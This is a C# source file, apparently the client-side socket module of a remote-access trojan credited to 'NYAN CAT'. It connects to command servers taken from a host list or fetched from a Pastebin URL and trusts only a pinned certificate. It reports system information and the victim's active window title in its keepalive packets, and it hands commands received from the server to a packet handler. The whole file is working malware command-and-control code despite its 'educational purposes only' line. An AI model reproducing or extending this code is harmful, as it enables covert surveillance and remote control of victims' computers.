using Client.Handle_Packet;
using Client.Helper;
using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Threading;
using System.Net.Security;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using System.Net;
using MessagePackLib.MessagePack;

//       │ Author     : NYAN CAT
//       │ Name       : Nyan Socket v0.1
//       │ Contact    : https://github.com/NYAN-x-CAT

//       This program is distributed for educational purposes only.

namespace Client.Connection
{
    public static class ClientSocket
    {
        public static Socket TcpClient { get; set; } //Main socket
        public static SslStream SslClient { get; set; } //Main SSLstream
        private static byte[] Buffer { get; set; } //Socket buffer
        private static long HeaderSize { get; set; } //Recevied size
        private static long Offset { get; set; } // Buffer location
        private static Timer KeepAlive { get; set; } //Send Performance
        public static bool IsConnected { get; set; } //Check socket status
        private static object SendSync { get; } = new object(); //Sync send
        private static Timer Ping { get; set; } //Send ping interval
        public static int Interval { get; set; } //ping value
        public static bool ActivatePong { get; set; }


        public static void InitializeClient() //Connect & reconnect
        {
            try
            {

                TcpClient = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                {
                    ReceiveBufferSize = 50 * 1024,
                    SendBufferSize = 50 * 1024,
                };

                if (Settings.Pastebin == "null")
                {
                    string ServerIP = Settings.Hosts.Split(',')[new Random().Next(Settings.Hosts.Split(',').Length)];
                    int ServerPort = Convert.ToInt32(Settings.Ports.Split(',')[new Random().Next(Settings.Ports.Split(',').Length)]);

                    if (IsValidDomainName(ServerIP)) //check if the address is alphanumric (meaning its a domain)
                    {
                        IPAddress[] addresslist = Dns.GetHostAddresses(ServerIP); //get all IP's connected to that domain

                        foreach (IPAddress theaddress in addresslist) //we do a foreach becasue a domain can lead to multiple IP's
                        {
                            try
                            {
                                TcpClient.Connect(theaddress, ServerPort); //lets try and connect!
                                if (TcpClient.Connected) break;
                            }
                            catch { }
                        }
                    }
                    else
                    {
                        TcpClient.Connect(ServerIP, ServerPort); //legacy mode connect (no DNS)
                    }
                }
                else
                {
                    using (WebClient wc = new WebClient())
                    {
                        NetworkCredential networkCredential = new NetworkCredential("", "");
                        wc.Credentials = networkCredential;
                        string resp = wc.DownloadString(Settings.Pastebin);
                        string[] spl = resp.Split(new[] { ":" }, StringSplitOptions.None);
                        Settings.Hosts = spl[0];
                        Settings.Ports = spl[new Random().Next(1, spl.Length)];
                        TcpClient.Connect(Settings.Hosts, Convert.ToInt32(Settings.Ports));
                    }
                }

                if (TcpClient.Connected)
                {
                    Debug.WriteLine("Connected!");
                    IsConnected = true;
                    SslClient = new SslStream(new NetworkStream(TcpClient, true), false, ValidateServerCertificate);
                    SslClient.AuthenticateAsClient(TcpClient.RemoteEndPoint.ToString().Split(':')[0], null, SslProtocols.Tls, false);
                    HeaderSize = 4;
                    Buffer = new byte[HeaderSize];
                    Offset = 0;
                    Send(IdSender.SendInfo());
                    Interval = 0;
                    ActivatePong = false;
                    KeepAlive = new Timer(new TimerCallback(KeepAlivePacket), null, new Random().Next(10 * 1000, 15 * 1000), new Random().Next(10 * 1000, 15 * 1000));
                    Ping = new Timer(new TimerCallback(Pong), null, 1, 1);
                    SslClient.BeginRead(Buffer, (int)Offset, (int)HeaderSize, ReadServertData, null);
                }
                else
                {
                    IsConnected = false;
                    return;
                }
            }
            catch
            {
                Debug.WriteLine("Disconnected!");
                IsConnected = false;
                return;
            }
        }

        private static bool IsValidDomainName(string name)
        {
            return Uri.CheckHostName(name) != UriHostNameType.Unknown;
        }

        private static bool ValidateServerCertificate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
        {
#if DEBUG
            return true;
#endif
            return Settings.ServerCertificate.Equals(certificate);
        }

        public static void Reconnect()
        {
            try
            {
                SslClient?.Dispose();
                TcpClient?.Dispose();
                Ping?.Dispose();
                KeepAlive?.Dispose();
            }
            catch { }
            IsConnected = false;
        }

        public static void ReadServertData(IAsyncResult ar) //Socket read/recevie
        {
            try
            {
                if (!TcpClient.Connected || !IsConnected)
                {
                    IsConnected = false;
                    return;
                }
                int recevied = SslClient.EndRead(ar);
                if (recevied > 0)
                {
                    Offset += recevied;
                    HeaderSize -= recevied;
                    if (HeaderSize == 0)
                    {
                        HeaderSize = BitConverter.ToInt32(Buffer, 0);
                        Debug.WriteLine("/// Client Buffersize " + HeaderSize.ToString() + " Bytes  ///");
                        if (HeaderSize > 0)
                        {
                            Offset = 0;
                            Buffer = new byte[HeaderSize];
                            while (HeaderSize > 0)
                            {
                                int rc = SslClient.Read(Buffer, (int)Offset, (int)HeaderSize);
                                if (rc <= 0)
                                {
                                    IsConnected = false;
                                    return;
                                }
                                Offset += rc;
                                HeaderSize -= rc;
                                if (HeaderSize < 0)
                                {
                                    IsConnected = false;
                                    return;
                                }
                            }
                            Thread thread = new Thread(new ParameterizedThreadStart(Packet.Read));
                            thread.Start(Buffer);
                            Offset = 0;
                            HeaderSize = 4;
                            Buffer = new byte[HeaderSize];
                        }
                        else
                        {
                            HeaderSize = 4;
                            Buffer = new byte[HeaderSize];
                            Offset = 0;
                        }
                    }
                    else if (HeaderSize < 0)
                    {
                        IsConnected = false;
                        return;
                    }
                    SslClient.BeginRead(Buffer, (int)Offset, (int)HeaderSize, ReadServertData, null);
                }
                else
                {
                    IsConnected = false;
                    return;
                }
            }
            catch
            {
                IsConnected = false;
                return;
            }
        }

        public static void Send(byte[] msg)
        {
            lock (SendSync)
            {
                try
                {
                    if (!IsConnected)
                    {
                        return;
                    }

                    byte[] buffersize = BitConverter.GetBytes(msg.Length);
                    TcpClient.Poll(-1, SelectMode.SelectWrite);
                    SslClient.Write(buffersize, 0, buffersize.Length);

                    if (msg.Length > 1000000) //1mb
                    {
                        Debug.WriteLine("send chunks");
                        using (MemoryStream memoryStream = new MemoryStream(msg))
                        {
                            int read = 0;
                            memoryStream.Position = 0;
                            byte[] chunk = new byte[50 * 1000];
                            while ((read = memoryStream.Read(chunk, 0, chunk.Length)) > 0)
                            {
                                TcpClient.Poll(-1, SelectMode.SelectWrite);
                                SslClient.Write(chunk, 0, read);
                                SslClient.Flush();
                            }
                        }
                    }
                    else
                    {
                        TcpClient.Poll(-1, SelectMode.SelectWrite);
                        SslClient.Write(msg, 0, msg.Length);
                        SslClient.Flush();
                    }
                }
                catch
                {
                    IsConnected = false;
                    return;
                }
            }
        }

        public static void KeepAlivePacket(object obj)
        {
            try
            {
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "Ping";
                msgpack.ForcePathObject("Message").AsString = Methods.GetActiveWindowTitle();
                Send(msgpack.Encode2Bytes());
                GC.Collect();
                ActivatePong = true;
            }
            catch { }
        }

        private static void Pong(object obj)
        {
            try
            {
                if (ActivatePong && IsConnected)
                {
                    Interval++;
                }
            }
            catch { }
        }
    }
}
